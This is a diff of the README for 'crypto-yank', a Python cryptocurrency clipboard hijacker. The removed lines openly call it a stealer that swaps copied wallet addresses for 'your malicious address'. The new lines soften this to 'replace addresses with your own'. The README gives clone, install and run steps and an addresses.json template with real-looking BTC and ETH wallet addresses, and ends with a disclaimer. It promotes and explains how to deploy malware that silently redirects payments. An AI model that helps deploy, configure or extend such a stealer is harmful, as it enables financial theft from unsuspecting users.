@@ -1,21 +1,17 @@
-<img align='center' src='.github/logo.png'></img>
-<h3 align='center'>crypto-currency clipboard stealer.</h3>
-<hr>
+<p align="center"><img src=".github/logo.png" width="280" align="middle"></img>
+</p>
+<h3 align="center">Replace crypto-currency addresses with your own.</h3>
 
-<img src='.github/demo.gif'></img>
+## Demo:
+<img src=".github/demo.gif"></img>
 
-### Features:
 
-* Written in Python 3
-* Support For: `Bitcoin (Legacy & Segwit),Etherum,Dash,Doge,Ripple and Monero.`
-* Easy setup script.
-* Specific crypto replacement.
-* Comprised of regex to find and match addresses.
-* Logging to `log.txt`
+## About/Usage:
 
 ### About:
 
-**crypto-yank** is a clipboard stealer that replaces crypto-currency addresses found in the clipboard with your malicious address. When no address is found crypto-yank remains dormant until it finds a match.
+crypto-yank matches crypto-currency addresses found in the clipboard using regex. When no addresses are in the clipboard, crypto-yank will remain dormant and not interact with the users clipboard.
+
 
 ### Usage:
 
@@ -23,70 +19,67 @@
 git clone https://github.com/jacques-andre/crypto-yank
 cd crypto-yank
 pip3 install -r requirements.txt 
-python3 setup.py 
 python3 crypto-yank.py
 ```
-##### Optional arguments for `crypto-yank.py`:
+
+##### Optional arguments:
 
 ```
---verbose 
---log > (Logs output to a txt file named log.txt)
+--log 
 ```
 
-If you don't want to use the setup script you can provide your own `addresses.json` in the following format:
+`addresses.json`: Holds the master addresses (what you want to replace the clipboard with). Change the "replace_me" strings with your own addresses.
 
-**`addresses.json`**
+**If you don't want to monitor specific cryptos you can replace the string with `"null"`.**
+
+**Example:**
+
+`addresses.json:`
 ```json
 {
-    "legacy_btc": "leg_ad",
-    "segwit_btc": "seg_ad",
-    "xmr": "xmr_ad",
-    "eth": "eth_ad",
-    "dash": "dash_ad",
-    "ripple": "ripple_ad",
-    "doge": "doge_ad"
+    "btc": "bc1qq9y4gc3c435uqhrctsp67kvyv4enqgky5p2375",
+    "xmr": "null",
+    "eth": "0x4BDDeddfbb17CAE7A89b305B494FFd70CCE5B29B",
+    "dash": "null",
+    "xrp": "null",
+    "doge": "null",
+    "ada" : "null",
+    "dot" : "null",
+    "lite" : "null"
 }
 ```
-You can also provide the value `NULL` to specific cryptos if you wish not to monitor them:
+
+Now crypto-yank will only monitor Bitcoin & Ethereum addresses.
+
+
+## Supported Coins:
+
+
+- Bitcoin (`$BTC`)
+- Dash (`$DASH`)
+- Ethereum (`$ETH`)
+- Monero (`$XMR`)
+- Litecoin (`$LTC`)
+- Cardano (`$ADA`)
+- Polkadot (`$DOT`)
+- Doge (`$DOGE`)
+- Ripple (`$XRP`)
+
+
+More on the way....
+
+### Donate:
+***Everything about crypto-yank is free, donate to fuel development.***
+
+*Make sure crypto-yank isn't running ;)*
+
+
 ```
-{
-    "legacy_btc": "leg_ad",
-    "segwit_btc": "seg_ad",
-    "xmr": "NULL",
-    "eth": "eth_ad",
-    "dash": "dash_ad",
-    "ripple": "ripple_ad",
-    "doge": "doge_ad"
-}
-```
-Using the string `NULL` for `xmr` would now ignore any Monero addresses crypto-yank finds.
-
-##### *NOTE: Bitcoin addresses are mandatory including (segwit and legacy).
-
-Once this file is created in the same directory as `crypto-yank.py` you can run `crypto-yank.py` to start monitoring.
-
-### Demo:
-
-### [Video](https://streamable.com/341s0a)
-
-### Requirements:
-
-[requirements.txt](https://github.com/jacques-andre/crypto-yank/blob/master/requirements.txt)
-
-```
-pyperclip==1.8.0
+ETH: 0x4BDDeddfbb17CAE7A89b305B494FFd70CCE5B29B
+BTC: bc1qq9y4gc3c435uqhrctsp67kvyv4enqgky5p2375
 ```
 
-### Upcoming/Todo:
-- [ ] Add more cryptos!
-- [x] Logging to text file.
-- [x] Better video demo.
 
-### License
-[GPLv3](https://github.com/jacques-andre/crypto-yank/blob/master/LICENSE)
-<hr>
-
-**Warning**
+#### Warning:
 
 I am not responsible for any misuse or damage caused by this program. Use this tool at your own risk!
-
